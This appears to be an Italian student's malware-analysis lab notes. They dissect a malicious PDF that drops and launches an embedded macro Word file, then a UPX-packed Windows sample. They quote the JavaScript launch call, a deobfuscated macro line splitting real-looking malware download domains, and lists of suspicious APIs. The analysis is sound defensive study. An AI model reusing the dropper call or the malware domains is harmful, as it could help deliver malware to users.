# 1. Analisi di `important.pdf`
Path: `.../malicious-document/important.pdf`

## Analisi del `.pdf`

Dall'analisi con `pdf-parse.py` si nota che il pdf contiene un file embeddato che probabilmente è un file word che contiene delle macro: `749048.docm`

Si può anche usare `yara`: `yara -w -s -m <regole_yara> important.pdf`.
Non dice troppo tranne che all'interno del pdf è stato inserito un numero grande: `Big_Numbers1`.

`peepdf -i important.pdf` -> apre la shell interattiva
- `object 5` - codice JS
	- `this.exportDataObject({ cName: "749048.docm", nLaunch: 2 });` - tale funzione salva questo file in locale e lo esegue perché il secondo parametro ha valore `2`.
- `object 11` - notiamo un riferimento ad `object 10` -> `object 4` -> `object 3`.

Quindi ora possiamo esportare l'`object 3`:
`pdf-parser.py --object 3 -w -f -d docfile.docm important.pdf`
- `--object 3` - specifica il numero  dell'oggetto da estrarre
- `-w` - scrive il raw del file
- `-f` - filtra il contenuto dell'oggetto
- `-d docfile.docm` - dumpa il contenuto in nuovo file

Ora abbiamo ottenuto un word (probabilmente cattivo).
## Analisi del file `.docm`
Tipo del file estratto: `Microsoft Word 2007+`, quindi il nuovo tipo.

Usiamo `yara` sul file estratto:
`zipdump.py -y <regole> docfile.docm`
Ci permette di riassumere il contenuto del file e di catalogarlo.

Con `olevba` si ottiene un recap della pericolosità del file.
Possiamo estrarre la macro per analizzarla con `vmonkey`, attraverso il comando `olevba -c docfile.docm > macro.vba`.

La macro è composta da 3 moduli all'interno del quale il codice possiede nomi di variabili strani per aumentare l'illeggibilità del codice.

Inoltre tra le stringhe della macro sono presenti:
- `http://`
- `rundll32.exe` - viene usato per lanciare dll da tutti i tipi di malware
- `setRequestHeader`

Probabilmente il codice della macro cerca di collegarsi alla rete per comunicare con qualcuno/qualcosa.

Usa diversi tipi di offuscamento quindi: `olevba --reveal --deobf macro.vba`.

Analizzando il codice troviamo questo comando:
`MovedPermanently = Split("sherwoodbusiness.com/9yg65Vrootcellar.us/9yg65Vsgph.comcastbiz.net/9yg65", Odish.Command.Caption)`

Che splitta degli url, con un'analisi con virus total si riconosce un dominio che permette di scaricare un noto malware.

---

# 2. Analisi di `VirusShare_...` malware
Windows Path: `C:\User\malware\Desktop\Samples\Malware\other-files`

## Analisi Statica
Si nota subito che è un file impacchettato con UPX, quindi:
`upx -d ./VirusShare -o ./unpacked`

Ora si può rifare l'analisi con `PEstudio`.

Vengono evidenziate:
- chiamate alla libreria `urlmon.dll`
- chiamate alle API di rete in particolare
	- `URLDownloadToFileA` - *probabilmente scarica qualcosa da internet*
	- `InternetSetOptionA`
- chiamate ad API di modifica di registri:
	- `RegSetValueA`
- `VirtualAlloc` - per lo spacchettamento del file in esecuzione
- `WriteFile` - scrittura su file
- `Sleep` - come tecnica di anti-debugging
- chiamate per l'esecuzione e la gestione di altri processi:
	- `GetCurrentProcess`
	- `TerminateProcess`
	- `CreateProcess`
- caricamento delle librerie con `GetProcAddress`

Nelle stringhe abbiamo:
- registri per raggiungere persistenza: `System/.../Run`
- `msiau.dll` - non dichiarata negli imports quindi magari è caricata a tempo d'esecuzione
- riferimenti a file di log
- riferimenti a svariati eseguibili
- URLs che interrogano file `.php`
- riferimenti ad un botto di pornazzi 🤙 (california vibes)